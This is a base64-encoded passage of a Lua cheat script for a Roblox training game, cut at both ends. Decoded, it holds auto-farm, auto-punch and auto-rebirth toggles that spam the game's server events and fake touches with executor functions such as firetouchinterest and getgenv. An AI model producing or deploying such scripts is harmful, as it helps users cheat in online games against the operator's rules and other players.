vbiBhdXRvUHVuY2goKQogICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICBsb2NhbCBwbGF5ZXJOYW1lID0gcGxheWVyLk5hbWUKICAgIF9HLnB1bmNoYW5pbSA9IHRydWUKCiAgICBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpICAKICAgICAgICBpZiBfRy5wdW5jaGFuaW0gdGhlbiAgCiAgICAgICAgICAgIGxvY2FsIHB1bmNoVG9vbCA9ICAKICAgICAgICAgICAgICAgIHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSBvciAgCiAgICAgICAgICAgICAgICBnYW1lLldvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZChwbGF5ZXJOYW1lKSBhbmQgZ2FtZS5Xb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQocGxheWVyTmFtZSk6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikgIAoKICAgICAgICAgICAgaWYgcHVuY2hUb29sIHRoZW4gIAogICAgICAgICAgICAgICAgaWYgcHVuY2hUb29sLlBhcmVudCB+PSBnYW1lLldvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZChwbGF5ZXJOYW1lKSB0aGVuICAKICAgICAgICAgICAgICAgICAgICBwdW5jaFRvb2wuUGFyZW50ID0gZ2FtZS5Xb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQocGxheWVyTmFtZSkKICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgICAgICAgICAgICBwdW5jaFRvb2w6QWN0aXZhdGUoKQogICAgICAgICAgICBlbHNlICAKICAgICAgICAgICAgICAgIHdhcm4oIlB1bmNoIHRvb2wgbm90IGZvdW5kIikgIAogICAgICAgICAgICAgICAgX0cucHVuY2hhbmltID0gZmFsc2UKICAgICAgICAgICAgZW5kICAKICAgICAgICBlbmQgIAogICAgZW5kKQplbmQKCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFB1bmNoIiwKICAgIERlc2MgPSAiQXV0b21hdGljIHB1bmNoIHRvb2wgYWN0aXZhdGlvbiIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBfRy5wdW5jaGFuaW0gPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICAgICAgYXV0b1B1bmNoKCkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gSW5kaXZpZHVhbCBFeGVyY2lzZSBUb2dnbGVzCmxvY2FsIGZ1bmN0aW9uIGF1dG9NdXNjbGUoYWN0aW9uKQogICAgbG9jYWwgcGxheWVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKICAgIHdoaWxlIF9HW2FjdGlvbl0gZG8KICAgICAgICBsb2NhbCB0b29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKGFjdGlvbikgCiAgICAgICAgaWYgdG9vbCB0aGVuCiAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICB0b29sOkFjdGl2YXRlKCkKICAgICAgICBlbmQKICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicmVwIiwgYWN0aW9uKQogICAgICAgIHRhc2sud2FpdCgpCiAgICBlbmQKCiAgICBpZiBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKGFjdGlvbikgdGhlbgogICAgICAgIHBsYXllci5DaGFyYWN0ZXJbYWN0aW9uXS5QYXJlbnQgPSBwbGF5ZXIuQmFja3BhY2sKICAgIGVuZAplbmQKCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFdlaWdodCIsCiAgICBEZXNjID0gIkF1dG9tYXRpYyB3ZWlnaHQgdHJhaW5pbmciLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgX0dbIldlaWdodCJdID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuIAogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkgYXV0b011c2NsZSgiV2VpZ2h0IikgZW5kKSAKICAgICAgICBlbmQKICAgIGVuZAp9KQoKQXV0b0Zhcm06VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gUHVzaHVwcyIsCiAgICBEZXNjID0gIkF1dG9tYXRpYyBwdXNodXBzIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIF9HWyJQdXNodXBzIl0gPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIHRoZW4gCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKSBhdXRvTXVzY2xlKCJQdXNodXBzIikgZW5kKSAKICAgICAgICBlbmQKICAgIGVuZAp9KQoKQXV0b0Zhcm06VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gSGFuZHN0YW5kcyIsCiAgICBEZXNjID0gIkF1dG9tYXRpYyBoYW5kc3RhbmRzIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIF9HWyJIYW5kc3RhbmRzIl0gPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIHRoZW4gCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKSBhdXRvTXVzY2xlKCJIYW5kc3RhbmRzIikgZW5kKSAKICAgICAgICBlbmQKICAgIGVuZAp9KQoKQXV0b0Zhcm06VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gU2l0dXBzIiwKICAgIERlc2MgPSAiQXV0b21hdGljIHNpdHVwcyIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBfR1siU2l0dXBzIl0gPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIHRoZW4gCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKSBhdXRvTXVzY2xlKCJTaXR1cHMiKSBlbmQpIAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBPUCBGYXJtIENvbWJvcyBTZWN0aW9uCkF1dG9GYXJtOlNlY3Rpb24oe1RpdGxlID0gIk9QIEZBUk0gQ09NQk9TIn0pCgotLSBQdXNodXBzICsgSnVuZ2xlIFJvY2sgQ29tYm8KQXV0b0Zhcm06VG9nZ2xlKHsKICAgIFRpdGxlID0gIlB1c2h1cHMgKyBKdW5nbGUgUm9jayIsCiAgICBEZXNjID0gIkF1dG8gUHVzaHVwcywgSnVuZ2xlIFJvY2sgJiBBdXRvIFB1bmNoIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGdldGdlbnYoKS5hdXRvRmFybSA9IHN0YXRlCiAgICAgICAgX0cuQXV0b1B1c2h1cHMgPSBzdGF0ZQogICAgICAgIGF1dG9QdW5jaE5vQW5pbSA9IHN0YXRlCiAgICAgICAgc2VsZWN0cm9jayA9ICJBbmNpZW50IEp1bmdsZSBSb2NrIgoKICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgZ2V0Z2VudigpLmF1dG9GYXJtIGRvCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMSkKICAgICAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuYXV0b0Zhcm0gdGhlbiBicmVhayBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICAgICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgIGlmIG5vdCBjaGFyYWN0ZXIgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICBpZiBfRy5BdXRvUHVzaHVwcyB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcHVzaHVwc1Rvb2wgPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1c2h1cHMiKSBvciBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1c2h1cHMiKQogICAgICAgICAgICAgICAgICAgIGlmIHB1c2h1cHNUb29sIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgY2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbChwdXNodXBzVG9vbCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJyZXAiKQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIGF1dG9QdW5jaE5vQW5pbSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcHVuY2hUb29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpIG9yIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgICAgICAgICAgICAgIGlmIHB1bmNoVG9vbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHB1bmNoVG9vbC5QYXJlbnQgfj0gY2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1bmNoVG9vbC5QYXJlbnQgPSBjaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJyaWdodEhhbmQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgImxlZnRIYW5kIikKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgd2FybigiUHVuY2ggdG9vbCBub3QgZm91bmQiKQogICAgICAgICAgICAgICAgICAgICAgICBhdXRvUHVuY2hOb0FuaW0gPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgcGxheWVyOkZpbmRGaXJzdENoaWxkKCJEdXJhYmlsaXR5IikgYW5kIHBsYXllci5EdXJhYmlsaXR5LlZhbHVlID49IDEwMDAwMDAwIHRoZW4KICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhnYW1lLldvcmtzcGFjZS5tYWNoaW5lc0ZvbGRlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiB2Lk5hbWUgPT0gIm5lZWRlZER1cmFiaWxpdHkiIGFuZCB2LlZhbHVlID09IDEwMDAwMDAwIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkxlZnRIYW5kIikgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLlJpZ2h0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5SaWdodEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBjaGFyYWN0ZXIuTGVmdEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBjaGFyYWN0ZXIuTGVmdEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnZXR0b29sIHRoZW4gcGNhbGwoZ2V0dG9vbCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAp9KQoKLS0gU2l0dXBzICsgSnVuZ2xlIFJvY2sgQ29tYm8KQXV0b0Zhcm06VG9nZ2xlKHsKICAgIFRpdGxlID0gIlNpdHVwcyArIEp1bmdsZSBSb2NrIiwKICAgIERlc2MgPSAiQXV0byBTaXR1cHMsIEp1bmdsZSBSb2NrICYgQXV0byBQdW5jaCIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBnZXRnZW52KCkuYXV0b0Zhcm0gPSBzdGF0ZQogICAgICAgIF9HLkF1dG9TaXR1cHMgPSBzdGF0ZQogICAgICAgIGF1dG9QdW5jaE5vQW5pbSA9IHN0YXRlCiAgICAgICAgc2VsZWN0cm9jayA9ICJBbmNpZW50IEp1bmdsZSBSb2NrIgoKICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgZ2V0Z2VudigpLmF1dG9GYXJtIGRvCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMSkKICAgICAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuYXV0b0Zhcm0gdGhlbiBicmVhayBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICAgICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgIGlmIG5vdCBjaGFyYWN0ZXIgdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICBpZiBfRy5BdXRvU2l0dXBzIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBzaXR1cHNUb29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJTaXR1cHMiKSBvciBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlNpdHVwcyIpCiAgICAgICAgICAgICAgICAgICAgaWYgc2l0dXBzVG9vbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woc2l0dXBzVG9vbCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJyZXAiKQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIGF1dG9QdW5jaE5vQW5pbSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcHVuY2hUb29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpIG9yIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgICAgICAgICAgICAgIGlmIHB1bmNoVG9vbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHB1bmNoVG9vbC5QYXJlbnQgfj0gY2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1bmNoVG9vbC5QYXJlbnQgPSBjaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJyaWdodEhhbmQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgImxlZnRIYW5kIikKICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgd2FybigiUHVuY2ggdG9vbCBub3QgZm91bmQiKQogICAgICAgICAgICAgICAgICAgICAgICBhdXRvUHVuY2hOb0FuaW0gPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgcGxheWVyOkZpbmRGaXJzdENoaWxkKCJEdXJhYmlsaXR5IikgYW5kIHBsYXllci5EdXJhYmlsaXR5LlZhbHVlID49IDEwMDAwMDAwIHRoZW4KICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhnYW1lLldvcmtzcGFjZS5tYWNoaW5lc0ZvbGRlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiB2Lk5hbWUgPT0gIm5lZWRlZER1cmFiaWxpdHkiIGFuZCB2LlZhbHVlID09IDEwMDAwMDAwIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkxlZnRIYW5kIikgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLlJpZ2h0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5SaWdodEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBjaGFyYWN0ZXIuTGVmdEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBjaGFyYWN0ZXIuTGVmdEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnZXR0b29sIHRoZW4gcGNhbGwoZ2V0dG9vbCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAp9KQoKLS0gSGFuZHN0YW5kcyArIEp1bmdsZSBSb2NrIENvbWJvCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJIYW5kc3RhbmRzICsgSnVuZ2xlIFJvY2siLAogICAgRGVzYyA9ICJBdXRvIEhhbmRzdGFuZHMsIEp1bmdsZSBSb2NrICYgQXV0byBQdW5jaCIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBnZXRnZW52KCkuYXV0b0Zhcm0gPSBzdGF0ZQogICAgICAgIF9HLkF1dG9IYW5kc3RhbmRzID0gc3RhdGUKICAgICAgICBhdXRvUHVuY2hOb0FuaW0gPSBzdGF0ZQogICAgICAgIHNlbGVjdHJvY2sgPSAiQW5jaWVudCBKdW5nbGUgUm9jayIKCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbwogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpCiAgICAgICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9GYXJtIHRoZW4gYnJlYWsgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBpZiBub3QgY2hhcmFjdGVyIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICAgICAgaWYgX0cuQXV0b0hhbmRzdGFuZHMgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGhhbmRzdGFuZHNUb29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJIYW5kc3RhbmRzIikgb3IgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIYW5kc3RhbmRzIikKICAgICAgICAgICAgICAgICAgICBpZiBoYW5kc3RhbmRzVG9vbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woaGFuZHN0YW5kc1Rvb2wpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicmVwIikKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBhdXRvUHVuY2hOb0FuaW0gdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHB1bmNoVG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSBvciBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaFRvb2wgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaFRvb2wuUGFyZW50IH49IGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwdW5jaFRvb2wuUGFyZW50ID0gY2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAicmlnaHRIYW5kIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJsZWZ0SGFuZCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHdhcm4oIlB1bmNoIHRvb2wgbm90IGZvdW5kIikKICAgICAgICAgICAgICAgICAgICAgICAgYXV0b1B1bmNoTm9BbmltID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGlmIHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiRHVyYWJpbGl0eSIpIGFuZCBwbGF5ZXIuRHVyYWJpbGl0eS5WYWx1ZSA+PSAxMDAwMDAwMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoZ2FtZS5Xb3Jrc3BhY2UubWFjaGluZXNGb2xkZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJuZWVkZWREdXJhYmlsaXR5IiBhbmQgdi5WYWx1ZSA9PSAxMDAwMDAwMCBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5SaWdodEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBjaGFyYWN0ZXIuUmlnaHRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLkxlZnRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLkxlZnRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2V0dG9vbCB0aGVuIHBjYWxsKGdldHRvb2wpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKfSkgICAgICAgIAogICAgICAgIAotLSBSZWJpcnRoIFRhYgpsb2NhbCBSZWJpcnRoVGFiID0gV2luZG93OlRhYih7VGl0bGUgPSAiUmViaXJ0aCIsIEljb24gPSAicm90YXRlLWN3In0pCgotLSBUYXJnZXQgUmViaXJ0aCBTZWN0aW9uClJlYmlydGhUYWI6U2VjdGlvbih7VGl0bGUgPSAiVGFyZ2V0IFJlYmlydGgifSkKbG9jYWwgdGFyZ2V0UmViaXJ0aCA9IDAKbG9jYWwgYXV0b1JlYmlydGhBY3RpdmUgPSBmYWxzZQoKUmViaXJ0aFRhYjpUZXh0Ym94KHsKICAgIFRpdGxlID0gIlRhcmdldCBSZWJpcnRoIiwKICAgIERlc2MgPSAiU2V0IHRhcmdldCByZWJpcnRoIG51bWJlciIsCiAgICBQbGFjZWhvbGRlciA9ICJFeGFtcGxlOiAxNTAwIiwKICAgIFZhbHVlID0gIiIsCiAgICBDbGVhclRleHRPbkZvY3VzID0gdHJ1ZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oaW5wdXQpCiAgICAgICAgbG9jYWwgdGFyZ2V0ID0gdG9udW1iZXIoaW5wdXQpCiAgICAgICAgaWYgdGFyZ2V0IGFuZCB0YXJnZXQgPiAwIHRoZW4KICAgICAgICAgICAgdGFyZ2V0UmViaXJ0aCA9IHRhcmdldAogICAgICAgIGVuZAogICAgZW5kCn0pCgpSZWJpcnRoVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFJlYmlydGggVG8gVGFyZ2V0IiwKICAgIERlc2MgPSAiUmViaXJ0aCB1bnRpbCB0YXJnZXQgcmVhY2hlZCIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgIGlmIHRhcmdldFJlYmlydGggPiAwIHRoZW4KICAgICAgICAgICAgICAgIGF1dG9SZWJpcnRoQWN0aXZlID0gdHJ1ZQogICAgICAgICAgICAgICAgdGFzay5zcGF3bihhdXRvUmViaXJ0aFRhcmdldCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZQogICAgICAgICAgICBhdXRvUmViaXJ0aEFjdGl2ZSA9IGZhbHNlCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIE90aGVyIEZlYXR1cmVzIFNlY3Rpb24KUmViaXJ0aFRhYjpTZWN0aW9uKHtUaXRsZSA9ICJOb3JtYWwgUmViaXJ0aCJ9KQoKUmViaXJ0aFRhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBSZWJpcnRoIChJTkZJTklURSkiLAogICAgRGVzYyA9ICJDb250aW51b3VzIHJlYmlydGgiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgYXV0b1JlYmlydGhFbmFibGVkID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuIHRhc2suc3Bhd24oYXV0b1JlYmlydGhJbmZpbml0ZSkgZW5kCiAgICBlbmQKfSkKClJlYmlydGhUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gU2l6ZSAyIiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBzZXQgc2l6ZSB0byAyIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIHNpemVDaGFuZ2VFbmFibGVkID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuIHRhc2suc3Bhd24oY2hhbmd